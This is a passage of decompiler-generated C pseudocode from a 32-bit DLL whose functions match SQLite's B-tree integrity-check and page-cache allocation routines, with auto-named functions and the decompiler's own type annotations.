  _DWORD *v14; // [esp-4h] [ebp-14h]
  _DWORD *v15; // [esp-4h] [ebp-14h]
  int v16; // [esp+Ch] [ebp-4h] BYREF

  v4 = sub_100620A9(a1);
  if ( a2 > v4 )
    return 11;
  result = sub_100620C4(a1, &v16, a2);
  v6 = 0;
  a2 = result;
  if ( !result )
  {
    v7 = v16;
    if ( *(_WORD *)(v16 + 16) )
    {
      do
      {
        v8 = *(_DWORD *)(v7 + 64);
        v9 = (_BYTE *)(v8 + *(unsigned __int16 *)(v7 + 12) + 2 * v6);
        LOBYTE(v10) = v9[1];
        HIBYTE(v10) = *v9;
        v11 = (_BYTE *)(v8 + (unsigned __int16)(*(_WORD *)(v7 + 18) & v10));
        if ( !*(_BYTE *)(v7 + 3) )
        {
          v14 = a4;
          v12 = sub_10059C56(v11);
          a2 = sub_10065E9B(a1, v12, 1, v14);
          if ( a2 )
            goto LABEL_18;
        }
        a2 = sub_1006463B(v7, (int)v11);
        if ( a2 )
          goto LABEL_18;
      }
      while ( ++v6 < *(unsigned __int16 *)(v7 + 16) );
    }
    if ( *(_BYTE *)(v7 + 3) )
    {
      if ( a4 )
        *a4 += *(unsigned __int16 *)(v7 + 16);
    }
    else
    {
      v15 = a4;
      v13 = sub_10059C56((_BYTE *)(*(_DWORD *)(v7 + 64) + 8));
      a2 = sub_10065E9B(a1, v13, 1, v15);
      if ( a2 )
      {
LABEL_18:
        sub_100620FB(v7);
        return a2;
      }
    }
    if ( a3 )
    {
      sub_10064625(v7, (int *)&a2);
    }
    else
    {
      a2 = sub_1006EFC8(*(_DWORD *)(v7 + 68));
      if ( !a2 )
        sub_10061FAA(v7, **(unsigned __int8 **)(v7 + 64) | 8);
    }
    goto LABEL_18;
  }
  return result;
}

//----- (10065FB3) --------------------------------------------------------
int __usercall sub_10065FB3@<eax>(int a1@<ebx>, unsigned int a2, _DWORD *a3)
{
  int *v3; // esi
  int v4; // edi

  v3 = *(int **)(a1 + 4);
  sub_10068C39(a1);
  v4 = sub_10061587((int)v3, a2, 0);
  if ( !v4 )
    v4 = sub_10065E9B(v3, a2, 0, a3);
  sub_10068CA7(a1);
  return v4;
}

//----- (10065FF4) --------------------------------------------------------
int __cdecl sub_10065FF4(int a1, unsigned int a2, unsigned int *a3)
{
  int v3; // edi
  bool v4; // zf
  int result; // eax
  int v6; // eax
  unsigned int v7; // esi
  int v8; // esi
  unsigned int v9; // ebx
  int v10; // ecx
  int v11; // esi
  unsigned int v12; // eax
  int v13; // esi
  int v14; // [esp+10h] [ebp-Ch] BYREF
  int v15; // [esp+14h] [ebp-8h] BYREF
  unsigned int v16; // [esp+18h] [ebp-4h] BYREF

  v3 = *(_DWORD *)(a1 + 4);
  v4 = *(_DWORD *)(v3 + 8) == 0;
  v14 = 0;
  if ( !v4 )
    return 262;
  result = sub_10062069((int *)v3, a2, &v14, 0);
  if ( !result )
  {
    v15 = sub_10065FB3(a1, a2, 0);
    if ( v15 )
    {
LABEL_5:
      v6 = v14;
LABEL_23:
      sub_100620FB(v6);
      return v15;
    }
    *a3 = 0;
    if ( a2 <= 1 )
    {
      v13 = v14;
      sub_10061FAA(v14, 9);
      v6 = v13;
      goto LABEL_23;
    }
    if ( !*(_BYTE *)(v3 + 18) )
    {
      sub_10064625(v14, &v15);
      goto LABEL_5;
    }
    sub_1006618B(a1, 4, (int *)&v16);
    v7 = v16;
    if ( a2 == v16 )
    {
      sub_10064625(v14, &v15);
      sub_100620FB(v14);
      result = v15;
      if ( v15 )
        return result;
LABEL_16:
      v10 = *(unsigned __int16 *)(v3 + 20);
      --v16;
      v11 = 0x40000000 / v10 + 1;
      while ( 1 )
      {
        if ( v16 != v11 )
        {
          v12 = sub_1006166F(v3, v16);
          if ( v12 != v16 )
            break;
        }
        --v16;
      }
      return sub_100661BB(a1, 4, v16);
    }
    sub_100620FB(v14);
    result = sub_10062069((int *)v3, v7, &v14, 0);
    if ( result )
      return result;
    v8 = sub_10062D4C(v14, (int *)v3, a2, 1, 0, 0);
    sub_100620FB(v14);
    if ( v8 )
      return v8;
    v9 = v16;
    v14 = 0;
    v15 = sub_10062069((int *)v3, v16, &v14, 0);
    sub_10064625(v14, &v15);
    sub_100620FB(v14);
    result = v15;
    if ( !v15 )
    {
      *a3 = v9;
      goto LABEL_16;
    }
  }
  return result;
}

//----- (1006618B) --------------------------------------------------------
int __usercall sub_1006618B@<eax>(int a1@<eax>, int a2, int *a3)
{
  int v4; // esi

  v4 = *(_DWORD *)(a1 + 4);
  sub_10068C39(a1);
  *a3 = sub_10059C56((_BYTE *)(*(_DWORD *)(*(_DWORD *)(v4 + 12) + 64) + 4 * a2 + 36));
  return sub_10068CA7(a1);
}

//----- (100661BB) --------------------------------------------------------
int __usercall sub_100661BB@<eax>(int a1@<ebx>, int a2, int a3)
{
  int v3; // esi
  int v4; // eax
  int v5; // edi
  char v6; // cl
  int v8; // [esp+8h] [ebp-4h]

  v3 = *(_DWORD *)(a1 + 4);
  sub_10068C39(a1);
  v4 = *(_DWORD *)(v3 + 12);
  v5 = *(_DWORD *)(v4 + 64);
  v8 = sub_1006EFC8(*(_DWORD *)(v4 + 68));
  if ( !v8 )
  {
    sub_10059C70((_BYTE *)(v5 + 4 * a2 + 36), a3);
    if ( a2 == 7 )
      *(_BYTE *)(v3 + 19) = v6;
  }
  sub_10068CA7(a1);
  return v8;
}
// 100661F8: variable 'v6' is possibly undefined

//----- (10066209) --------------------------------------------------------
int __usercall sub_10066209@<eax>(int a1@<eax>, _QWORD *a2)
{
  int result; // eax
  int v4; // ecx
  char v5; // bl
  _WORD *v6; // eax
  int v7; // eax
  _BYTE *v8; // eax
  int v9; // edi
  _BYTE *v10; // eax
  __int16 v11; // dx
  int v12; // eax
  __int64 v13; // [esp+Ch] [ebp-8h]

  v13 = 0i64;
  for ( result = sub_10063878(a1); !result; result = sub_100637FB(a1, v12) )
  {
    v4 = *(_DWORD *)(a1 + 4 * *(__int16 *)(a1 + 84) + 88);
    v5 = *(_BYTE *)(v4 + 3);
    if ( v5 || !*(_BYTE *)(v4 + 2) )
      v13 += *(unsigned __int16 *)(v4 + 16);
    if ( v5 )
    {
      while ( *(_WORD *)(a1 + 84) )
      {
        sub_1006385B(a1);
        if ( *(_WORD *)(a1 + 2 * *(__int16 *)(a1 + 84) + 168) < *(_WORD *)(*(_DWORD *)(a1
                                                                                     + 4 * *(__int16 *)(a1 + 84)
                                                                                     + 88)
                                                                         + 16) )
        {
          v6 = (_WORD *)(a1 + 2 * *(__int16 *)(a1 + 84) + 168);
          ++*v6;
          v4 = *(_DWORD *)(a1 + 4 * *(__int16 *)(a1 + 84) + 88);
          goto LABEL_9;
        }
      }
      *a2 = v13;
      return 0;
    }
LABEL_9:
    v7 = *(unsigned __int16 *)(a1 + 2 * *(__int16 *)(a1 + 84) + 168);
    if ( v7 == *(unsigned __int16 *)(v4 + 16) )
    {
      v8 = (_BYTE *)(*(unsigned __int8 *)(v4 + 5) + *(_DWORD *)(v4 + 64) + 8);
    }
    else
    {
      v9 = *(_DWORD *)(v4 + 64);
      v10 = (_BYTE *)(v9 + *(unsigned __int16 *)(v4 + 12) + 2 * v7);
      LOBYTE(v11) = v10[1];
      HIBYTE(v11) = *v10;
      v8 = (_BYTE *)(v9 + (unsigned __int16)(*(_WORD *)(v4 + 18) & v11));
    }
    v12 = sub_10059C56(v8);
  }
  return result;
}

//----- (100662EC) --------------------------------------------------------
void __usercall sub_100662EC(int a1@<esi>, _BYTE *a2, char *a3, ...)
{
  int v3; // eax
  bool v4; // zf
  va_list va; // [esp+18h] [ebp+10h] BYREF

  va_start(va, a3);
  v3 = *(_DWORD *)(a1 + 16);
  if ( v3 )
  {
    ++*(_DWORD *)(a1 + 20);
    v4 = *(_DWORD *)(a1 + 40) == 0;
    *(_DWORD *)(a1 + 16) = v3 - 1;
    if ( !v4 )
      sub_100552D1(1, a1 + 28, asc_10181E34);
    if ( a2 )
      sub_100552D1(-1, a1 + 28, a2);
    sub_10054749(a1 + 28, 1, a3, (int *)va);
    if ( *(_BYTE *)(a1 + 52) )
      *(_DWORD *)(a1 + 24) = 1;
  }
}

//----- (10066355) --------------------------------------------------------
int __usercall sub_10066355@<eax>(int a1@<eax>, unsigned int a2@<ecx>, _BYTE *a3)
{
  int v3; // edx
  _DWORD *v4; // eax
  int v5; // ecx
  int result; // eax

  if ( a2 )
  {
    if ( a2 <= *(_DWORD *)(a1 + 8) )
    {
      v3 = *(_DWORD *)(a1 + 12);
      if ( *(_DWORD *)(4 * a2 + v3) == 1 )
      {
        sub_100662EC(a1, a3, a2ndReferenceTo, a2);
      }
      else
      {
        v4 = (_DWORD *)(v3 + 4 * a2);
        v5 = (*v4)++;
        result = 0;
        if ( v5 <= 1 )
          return result;
      }
    }
    else
    {
      sub_100662EC(a1, a3, aInvalidPageNum, a2);
    }
  }
  return 1;
}

//----- (100663A7) --------------------------------------------------------
void __usercall sub_100663A7(int a1@<eax>, int a2, unsigned __int8 a3, int a4, _BYTE *a5)
{
  int v6; // eax
  int v7; // [esp+8h] [ebp-8h] BYREF
  unsigned __int8 v8; // [esp+Fh] [ebp-1h] BYREF

  v6 = sub_1006175A(a2, *(int **)a1, &v8, &v7);
  if ( v6 )
  {
    if ( v6 == 7 || v6 == 3082 )
      *(_DWORD *)(a1 + 24) = 1;
    sub_100662EC(a1, a5, "Failed to read ptrmap key=%d", a2);
  }
  else if ( v8 != a3 || v7 != a4 )
  {
    sub_100662EC(a1, a5, "Bad ptr map entry key=%d expected=(%d,%d) got=(%d,%d)", a2, a3, a4, v8, v7);
  }
}
// 100663A7: using guessed type int var_8;

//----- (10066423) --------------------------------------------------------
void __usercall sub_10066423(int a1@<eax>, int *a2@<ecx>, int a3, int a4, _BYTE *a5)
{
  int v5; // edi
  _BYTE *v7; // ebx
  _BYTE *v8; // edi
  int v9; // ebx
  int v10; // eax
  int v11; // [esp+Ch] [ebp-18h]
  _BYTE *v13; // [esp+14h] [ebp-10h]
  _DWORD *v14; // [esp+18h] [ebp-Ch] BYREF
  int v15; // [esp+1Ch] [ebp-8h]
  int v16; // [esp+20h] [ebp-4h]

  v5 = a1;
  v11 = a4;
  while ( a4 > 0 )
  {
    --a4;
    if ( !a2[4] )
      break;
    if ( v5 < 1 )
    {
      sub_100662EC((int)a2, a5, "%d of %d pages missing from overflow list starting at %d", a4 + 1, v11, a1);
      return;
    }
    if ( sub_10066355((int)a2, v5, a5) )
      return;
    if ( sub_1006EB74(a2[1], v5, &v14, 0) )
    {
      sub_100662EC((int)a2, a5, "failed to get page %d", v5);
      return;
    }
    v7 = (_BYTE *)*v14;
    v13 = (_BYTE *)*v14;
    if ( a3 )
    {
      v15 = sub_10059C56(v7 + 4);
      if ( *(_BYTE *)(*a2 + 18) )
        sub_100663A7((int)a2, v5, 2u, 0, a5);
      if ( v15 <= (*(unsigned __int16 *)(*a2 + 22) >> 2) - 2 )
      {
        if ( v15 > 0 )
        {
          v8 = v7 + 8;
          v16 = v15;
          do
          {
            v9 = sub_10059C56(v8);
            if ( *(_BYTE *)(*a2 + 18) )
              sub_100663A7((int)a2, v9, 2u, 0, a5);
            sub_10066355((int)a2, v9, a5);
            v8 += 4;
            --v16;
          }
          while ( v16 );
          v7 = v13;
        }
        a4 -= v15;
      }
      else
      {
        sub_100662EC((int)a2, a5, "freelist leaf count too big on page %d", v5);
        --a4;
      }
    }
    else if ( *(_BYTE *)(*a2 + 18) && a4 > 0 )
    {
      v10 = sub_10059C56(v7);
      sub_100663A7((int)a2, v10, 4u, v5, a5);
    }
    v5 = sub_10059C56(v7);
    sub_1006EC75((int)v14);
  }
}
// 10066471: conditional instruction was optimized away because edi.4>=1

//----- (100665AF) --------------------------------------------------------
int __cdecl sub_100665AF(int a1, unsigned int a2, _BYTE *a3)
{
  int *v3; // esi
  int v4; // eax
  int v6; // eax
  int v7; // ebx
  int v8; // edi
  int v9; // eax
  bool v10; // zf
  int v11; // edi
  int v12; // esi
  _BYTE *v13; // eax
  __int16 v14; // cx
  _BYTE *v15; // esi
  int v16; // edi
  unsigned int v17; // eax
  _BYTE *v18; // ebx
  _BYTE *v19; // esi
  int v20; // ebx
  int v21; // ebx
  int v22; // eax
  int v23; // ebx
  int v24; // eax
  int v25; // edi
  int v26; // edi
  char *v27; // ecx
  _BYTE *v28; // edi
  unsigned __int16 v29; // ax
  size_t v30; // esi
  unsigned __int16 v31; // ax
  int v32; // ecx
  int v33; // eax
  int v34; // eax
  int v35; // ecx
  _BYTE *v36; // esi
  int v37; // eax
  int v38; // esi
  bool v39; // cc
  unsigned __int16 v40; // ax
  int v41; // edx
  int v42; // eax
  unsigned __int16 v43; // dx
  int i; // esi
  unsigned __int16 v45; // dx
  int j; // eax
  char v47; // cl
  int v48; // eax
  char v49[104]; // [esp+10h] [ebp-ACh] BYREF
  char v50[8]; // [esp+78h] [ebp-44h] BYREF
  int v51; // [esp+80h] [ebp-3Ch]
  unsigned int v52; // [esp+88h] [ebp-34h]
  unsigned __int16 v53; // [esp+92h] [ebp-2Ah]
  unsigned __int16 v54; // [esp+94h] [ebp-28h]
  int v55; // [esp+9Ch] [ebp-20h]
  _BYTE *v56; // [esp+A0h] [ebp-1Ch]
  int v57; // [esp+A4h] [ebp-18h]
  int v58; // [esp+A8h] [ebp-14h]
  void *v59; // [esp+ACh] [ebp-10h]
  int v60; // [esp+B0h] [ebp-Ch]
  int v61; // [esp+B4h] [ebp-8h] BYREF

  sub_10055543(100, (int)v49, "Page %d: ", a2);
  v3 = *(int **)a1;
  v4 = *(unsigned __int16 *)(*(_DWORD *)a1 + 22);
  v59 = *(void **)a1;
  v58 = v4;
  if ( !a2 || sub_10066355(a1, a2, a3) )
    return 0;
  v6 = sub_10062069(v3, a2, &v61, 0);
  if ( v6 )
  {
    sub_100662EC(a1, v49, "unable to get the page. error code=%d", v6);
    return 0;
  }
  v7 = v61;
  v8 = v61;
  *(_BYTE *)v61 = 0;
  v9 = sub_10061E53(v8);
  if ( v9 )
  {
    sub_100662EC(a1, v49, "btreeInitPage() returns error code %d", v9);
    sub_100620FB(v7);
    return 0;
  }
  v10 = *(_WORD *)(v7 + 16) == 0;
  v55 = 0;
  v60 = 0;
  if ( !v10 )
  {
    do
    {
      if ( !*(_DWORD *)(a1 + 16) )
        break;
      v11 = v60;
      sub_10055543(100, (int)v49, "On tree page %d cell %d: ", a2, v60);
      v12 = *(_DWORD *)(v7 + 64);
      v13 = (_BYTE *)(v12 + *(unsigned __int16 *)(v7 + 12) + 2 * v11);
      LOBYTE(v14) = v13[1];
      HIBYTE(v14) = *v13;
      v15 = (_BYTE *)((unsigned __int16)(*(_WORD *)(v7 + 18) & v14) + v12);
      v56 = v15;
      sub_100617C9((int)v50, (_BYTE *)v7, (int)v15);
      v16 = v61;
      v17 = v52;
      if ( !*(_BYTE *)(v61 + 2) )
        v17 = v51 + v52;
      if ( v17 <= v53 )
      {
        v19 = v59;
      }
      else
      {
        v18 = &v15[v54];
        v19 = v59;
        if ( (unsigned int)v18 <= *(_DWORD *)(v61 + 64) + (unsigned int)*((unsigned __int16 *)v59 + 11) )
        {
          v57 = (v17 - v53 + v58 - 5) / (v58 - 4);
          v20 = sub_10059C56(v18);
          if ( v19[18] )
            sub_100663A7(a1, v20, 3u, a2, v49);
          sub_10066423(v20, (int *)a1, 0, v57, v49);
        }
      }
      if ( !*(_BYTE *)(v16 + 3) )
      {
        v21 = sub_10059C56(v56);
        if ( v19[18] )
          sub_100663A7(a1, v21, 5u, a2, v49);
        v22 = sub_100665AF(a1, v21, v49);
        v23 = v22;
        if ( v60 > 0 && v22 != v55 )
          sub_100662EC(a1, v49, aChildPageDepth);
        v55 = v23;
      }
      v24 = *(unsigned __int16 *)(v16 + 16);
      ++v60;
      v3 = (int *)v59;
      v7 = v61;
    }
    while ( v60 < v24 );
  }
  if ( !*(_BYTE *)(v7 + 3) )
  {
    v25 = sub_10059C56((_BYTE *)(*(unsigned __int8 *)(v7 + 5) + *(_DWORD *)(v7 + 64) + 8));
    sub_10055543(100, (int)v49, "On page %d at right child: ", a2);
    if ( *((_BYTE *)v3 + 18) )
      sub_100663A7(a1, v25, 5u, a2, 0);
    sub_100665AF(a1, v25, v49);
  }
  v26 = *((unsigned __int16 *)v3 + 10);
  v61 = *(_DWORD *)(v7 + 64);
  v60 = *(unsigned __int8 *)(v7 + 5);
  v27 = (char *)sub_10066DBF(v26);
  v59 = v27;
  if ( v27 )
  {
    v28 = (_BYTE *)(v60 + v61);
    HIBYTE(v29) = *(_BYTE *)(v60 + v61 + 5);
    LOBYTE(v29) = *(_BYTE *)(v60 + v61 + 6);
    v30 = v29;
    memset(&v27[v29], 0, v58 - v29);
    memset(v59, 1, v30);
    HIBYTE(v31) = v28[3];
    LOBYTE(v31) = v28[4];
    v57 = v31;
    v32 = 3 - *(unsigned __int8 *)(v7 + 3);
    v33 = v60;
    v60 = 0;
    v34 = v33 + 4 * v32;
    v35 = v61;
    if ( v57 > 0 )
    {
      v36 = (_BYTE *)(v34 + v61);
      v56 = (_BYTE *)(v34 + v61);
      do
      {
        v37 = (unsigned __int8)v36[1];
        BYTE1(v37) = *v36;
        v38 = v37;
        v39 = v37 <= v58 - 4;
        v40 = 1024;
        if ( v39 )
        {
          v40 = sub_1006190B(v7, v38 + v35);
          v35 = v61;
        }
        v41 = v40 + v38 - 1;
        if ( v41 < v58 )
        {
          while ( v41 >= v38 )
            ++*((_BYTE *)v59 + v41--);
        }
        else
        {
          sub_100662EC(a1, 0, "Corruption detected in cell %d on page %d", v60, a2);
          v35 = v61;
        }
        ++v60;
        v36 = v56 + 2;
        v56 += 2;
      }
      while ( v60 < v57 );
    }
    HIWORD(v42) = 0;
    BYTE1(v42) = v28[1];
    LOBYTE(v42) = v28[2];
    while ( v42 > 0 )
    {
      HIBYTE(v43) = *(_BYTE *)(v35 + v42 + 2);
      LOBYTE(v43) = *(_BYTE *)(v35 + v42 + 3);
      for ( i = v43 + v42 - 1; i >= v42; --i )
        ++*((_BYTE *)v59 + i);
      HIBYTE(v45) = *(_BYTE *)(v35 + v42);
      LOBYTE(v45) = *(_BYTE *)(v35 + v42 + 1);
      v42 = v45;
    }
    v61 = 0;
    for ( j = 0; j < v58; ++j )
    {
      v47 = *((_BYTE *)v59 + j);
      if ( v47 )
      {
        if ( v47 > 1 )
        {
          sub_100662EC(a1, 0, "Multiple uses for byte %d of page %d", j, a2);
          break;
        }
      }
      else
      {
        ++v61;
      }
    }
    v48 = (unsigned __int8)v28[7];
    if ( v61 != v48 )
      sub_100662EC(a1, 0, "Fragmentation of %d bytes reported as %d on page %d", v61, v48, a2);
  }
  else
  {
    *(_DWORD *)(a1 + 24) = 1;
  }
  sub_10066DE3(v59);
  sub_100620FB(v7);
  return v55 + 1;
}
// 100665AF: using guessed type char var_44[8];

//----- (100669D1) --------------------------------------------------------
int __cdecl sub_100669D1(int a1, int a2, int a3, int a4, _DWORD *a5)
{
  int v5; // ebx
  int v6; // eax
  unsigned int v8; // eax
  unsigned int v9; // eax
  int v10; // esi
  int v11; // eax
  int v12; // eax
  unsigned int *v13; // esi
  int v14; // eax
  unsigned int v15; // esi
  bool v16; // zf
  int v17; // [esp-8h] [ebp-C4h]
  char v18[108]; // [esp+10h] [ebp-ACh] BYREF
  int v19[2]; // [esp+7Ch] [ebp-40h] BYREF
  unsigned int v20; // [esp+84h] [ebp-38h]
  int v21; // [esp+88h] [ebp-34h]
  int v22; // [esp+8Ch] [ebp-30h]
  int v23; // [esp+90h] [ebp-2Ch]
  int v24; // [esp+94h] [ebp-28h]
  int v25[6]; // [esp+98h] [ebp-24h] BYREF
  char v26; // [esp+B0h] [ebp-Ch]
  char v27; // [esp+B1h] [ebp-Bh]
  char v28; // [esp+B2h] [ebp-Ah]
  int v29; // [esp+B4h] [ebp-8h]
  int i; // [esp+D0h] [ebp+14h]
  int j; // [esp+D0h] [ebp+14h]

  v5 = *(_DWORD *)(a1 + 4);
  sub_10068C39(a1);
  v29 = *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v5 + 168) + 12);
  v19[0] = v5;
  v19[1] = *(_DWORD *)v5;
  v6 = sub_100620A9((int *)v5);
  v22 = a4;
  v20 = v6;
  v23 = 0;
  v24 = 0;
  *a5 = 0;
  if ( !v6 )
    goto LABEL_2;
  v21 = sub_10058C4C(4 * v6 + 4);
  if ( !v21 )
  {
    *a5 = 1;
LABEL_2:
    sub_10068CA7(a1);
    return 0;
  }
  v8 = 0;
  do
    *(_DWORD *)(v21 + 4 * v8++) = 0;
  while ( v8 <= v20 );
  v9 = 0x40000000 / *(unsigned __int16 *)(v5 + 20) + 1;
  if ( v9 <= v20 )
    *(_DWORD *)(v21 + 4 * v9) = 1;
  v25[1] = (int)v18;
  v25[2] = (int)v18;
  v25[0] = 0;
  v25[3] = 0;
  v25[4] = 100;
  v25[5] = 20000;
  v27 = 1;
  v28 = 0;
  v26 = 0;
  v10 = *(_DWORD *)(*(_DWORD *)(v5 + 12) + 64);
  v17 = sub_10059C56((_BYTE *)(v10 + 36));
  v11 = sub_10059C56((_BYTE *)(v10 + 32));
  sub_10066423(v11, v19, 1, v17, aMainFreelist);
  v12 = 0;
  for ( i = 0; i < a3; v12 = ++i )
  {
    if ( !v22 )
      break;
    v13 = (unsigned int *)(a2 + 4 * v12);
    v14 = *v13;
    if ( *v13 )
    {
      if ( *(_BYTE *)(v5 + 18) && v14 > 1 )
        sub_100663A7((int)v19, v14, 1u, 0, 0);
      sub_100665AF((int)v19, *v13, aListOfTreeRoot);
    }
  }
  v15 = 1;
  for ( j = 1; v15 <= v20; j = ++v15 )
  {
    if ( !v22 )
      break;
    if ( !*(_DWORD *)(v21 + 4 * v15) && (sub_1006166F(v5, v15) != v15 || !*(_BYTE *)(v5 + 18)) )
    {
      sub_100662EC((int)v19, 0, "Page %d is never used", v15);
      v15 = j;
    }
    if ( *(_DWORD *)(v21 + 4 * v15) && sub_1006166F(v5, v15) == v15 && *(_BYTE *)(v5 + 18) )
    {
      sub_100662EC((int)v19, 0, "Pointer map page %d is referenced", v15);
      v15 = j;
    }
  }
  if ( v29 != *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v5 + 168) + 12) )
    sub_100662EC(
      (int)v19,
      0,
      "Outstanding page count goes from %d to %d during this analysis",
      v29,
      *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v5 + 168) + 12));
  sub_10068CA7(a1);
  sub_10058E74(v21);
  if ( v24 )
  {
    sub_100553E9(v25);
    *a5 = v23 + 1;
    return 0;
  }
  v16 = v23 == 0;
  *a5 = v23;
  if ( v16 )
    sub_100553E9(v25);
  return sub_1005539C((int)v25);
}

//----- (10066C14) --------------------------------------------------------
BOOL __usercall sub_10066C14@<eax>(int a1@<eax>)
{
  return a1 && *(_BYTE *)(a1 + 8) == 2;
}

//----- (10066C25) --------------------------------------------------------
int __usercall sub_10066C25@<eax>(int a1@<eax>, size_t Size, int a3)
{
  int v4; // esi

  v4 = *(_DWORD *)(a1 + 4);
  sub_10068C39(a1);
  if ( !*(_DWORD *)(v4 + 40) && Size )
  {
    *(_DWORD *)(v4 + 40) = sub_10059025(Size);
    *(_DWORD *)(v4 + 44) = a3;
  }
  sub_10068CA7(a1);
  return *(_DWORD *)(v4 + 40);
}

//----- (10066C60) --------------------------------------------------------
int __usercall sub_10066C60@<eax>(char a1@<al>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // esi
  char v7; // [esp+Ch] [ebp-4h]

  v4 = 0;
  if ( *(_BYTE *)(a2 + 9) )
  {
    v7 = a1 + 1;
    sub_10068C39(a2);
    v4 = sub_100613B6(v7, a2, a3);
    if ( !v4 )
      v4 = sub_1006140B(a3, a2, v7);
    sub_10068CA7(a2);
  }
  return v4;
}

//----- (10066CAA) --------------------------------------------------------
void __usercall sub_10066CAA(int a1@<edx>, int *a2@<ecx>, int a3)
{
  int v3; // eax
  unsigned int v4; // edx

  if ( dword_10184334 )
  {
    v3 = 0;
    v4 = a1 & 0xFFFFFFF8;
    dword_10184324 = v4;
    dword_10184328 = (int)a2;
    dword_10184330 = 0;
    if ( a3 )
    {
      do
      {
        --a3;
        *a2 = v3;
        v3 = (int)a2;
        a2 = (int *)((char *)a2 + v4);
      }
      while ( a3 );
      dword_10184330 = v3;
    }
    dword_1018432C = (int)a2;
  }
}
// 10184324: using guessed type int dword_10184324;
// 10184328: using guessed type int dword_10184328;
// 1018432C: using guessed type int dword_1018432C;
// 10184330: using guessed type int dword_10184330;
// 10184334: using guessed type int dword_10184334;

//----- (10066CED) --------------------------------------------------------
int __usercall sub_10066CED@<eax>(int a1@<edi>)
{
  int v1; // esi
  int v2; // ecx
  int v3; // edx

  if ( a1 <= dword_10184324 && dword_10184330 )
  {
    v1 = dword_10184330;
    dword_10184330 = *(_DWORD *)dword_10184330;
    sub_100724A3(7, a1);
    v2 = 1;
    v3 = 1;
LABEL_6:
    sub_10072489(v2, v3);
    return v1;
  }
  sub_10061317(dword_1018430C);
  v1 = sub_10058C4C(a1);
  sub_10061305(dword_1018430C);
  if ( v1 )
  {
    v3 = dword_1018216C(v1);
    v2 = 2;
    goto LABEL_6;
  }
  return v1;
}
// 1018216C: using guessed type int (__cdecl *dword_1018216C)(_DWORD);
// 1018430C: using guessed type int dword_1018430C;
// 10184324: using guessed type int dword_10184324;
// 10184330: using guessed type int dword_10184330;

//----- (10066D54) --------------------------------------------------------
void __usercall sub_10066D54(_DWORD *a1@<esi>)
{
  int v1; // eax

  if ( a1 )
  {
    if ( (unsigned int)a1 < dword_10184328 || (unsigned int)a1 >= dword_1018432C )
    {
      v1 = dword_1018216C(a1);
      sub_10072489(2, -v1);
      sub_10058E74((int)a1);
    }
    else
    {
      sub_10072489(1, -1);
      *a1 = dword_10184330;
      dword_10184330 = (int)a1;
    }
  }
}
// 1018216C: using guessed type int (__cdecl *dword_1018216C)(_DWORD);
// 10184328: using guessed type int dword_10184328;
// 1018432C: using guessed type int dword_1018432C;
// 10184330: using guessed type int dword_10184330;

//----- (10066D9D) --------------------------------------------------------
void __usercall sub_10066D9D(int a1@<eax>)
{
  if ( a1 )
  {
    if ( *(_DWORD *)(*(_DWORD *)(a1 + 8) + 4) )
      --dword_10184318;
    sub_10066D54((_DWORD *)(a1 - **(_DWORD **)(a1 + 8)));
  }
}
// 10184318: using guessed type int dword_10184318;

//----- (10066DBF) --------------------------------------------------------
int __usercall sub_10066DBF@<eax>(int a1@<edi>)
{
  int v1; // esi

  sub_10061305(dword_1018430C);
  v1 = sub_10066CED(a1);
  sub_10061317(dword_1018430C);
  return v1;
}
// 1018430C: using guessed type int dword_1018430C;

//----- (10066DE3) --------------------------------------------------------
int __usercall sub_10066DE3@<eax>(_DWORD *a1@<esi>)
{
  sub_10061305(dword_1018430C);
  sub_10066D54(a1);
  return sub_10061317(dword_1018430C);
}
// 1018430C: using guessed type int dword_1018430C;

//----- (10066E01) --------------------------------------------------------
int __usercall sub_10066E01@<eax>(int a1@<esi>)
{
  unsigned int v1; // edi
  char *v2; // ebx
  _DWORD *j; // ecx
  char *v4; // eax
  _DWORD *v6; // [esp+8h] [ebp-8h]
  unsigned int i; // [esp+Ch] [ebp-4h]

  v1 = 2 * *(_DWORD *)(a1 + 24);
  if ( v1 < 0x100 )
    v1 = 256;
  sub_10061317(dword_1018430C);
  if ( *(_DWORD *)(a1 + 24) )
    sub_10069106();
  v2 = (char *)sub_10058CA3(4 * v1);
  if ( *(_DWORD *)(a1 + 24) )
    sub_10069112();
  sub_10061305(dword_1018430C);
  if ( v2 )
  {
    memset(v2, 0, 4 * v1);
    for ( i = 0; i < *(_DWORD *)(a1 + 24); ++i )
    {
      for ( j = *(_DWORD **)(*(_DWORD *)(a1 + 28) + 4 * i); j; j = v6 )
      {
        v6 = (_DWORD *)j[1];
        v4 = &v2[4 * (*j % v1)];
        j[1] = *(_DWORD *)v4;
        *(_DWORD *)v4 = j;
      }
    }
    sub_10058E74(*(_DWORD *)(a1 + 28));
    *(_DWORD *)(a1 + 28) = v2;
    *(_DWORD *)(a1 + 24) = v1;
  }
  return *(_DWORD *)(a1 + 28) != 0 ? 0 : 7;
}
// 1018430C: using guessed type int dword_1018430C;

//----- (10066EC6) --------------------------------------------------------
_DWORD *__usercall sub_10066EC6@<eax>(_DWORD *result@<eax>)
{
  int v1; // edx
  int v2; // ecx
  int v3; // ecx

  if ( result )
  {
    v1 = result[3];
    if ( v1 || result == (_DWORD *)dword_10184320 )
    {
      v2 = result[4];
      if ( v2 )
        *(_DWORD *)(v2 + 12) = v1;
      v3 = result[3];
      if ( v3 )
        *(_DWORD *)(v3 + 16) = result[4];
      if ( (_DWORD *)dword_1018431C == result )
        dword_1018431C = result[3];
      if ( (_DWORD *)dword_10184320 == result )
        dword_10184320 = result[4];
      result[3] = 0;
      result[4] = 0;
      result = (_DWORD *)result[2];
      --result[4];
    }
  }
  return result;
}
// 1018431C: using guessed type int dword_1018431C;
// 10184320: using guessed type int dword_10184320;

//----- (10066F21) --------------------------------------------------------
_DWORD *__usercall sub_10066F21@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // ecx
  _DWORD *result; // eax
  _DWORD *v3; // edx

  v1 = (_DWORD *)a1[2];
  for ( result = (_DWORD *)(v1[7] + 4 * (*a1 % v1[6])); ; result = v3 + 1 )
  {
    v3 = (_DWORD *)*result;
    if ( (_DWORD *)*result == a1 )
      break;
  }
  *result = v3[1];
  --v1[5];
  return result;
}

//----- (10066F45) --------------------------------------------------------
int sub_10066F45()
{
  int result; // eax
  _DWORD *v1; // esi

  for ( result = dword_10184318; dword_10184318 > dword_10184310; result = dword_10184318 )
  {
    result = dword_10184320;
    if ( !dword_10184320 )
      break;
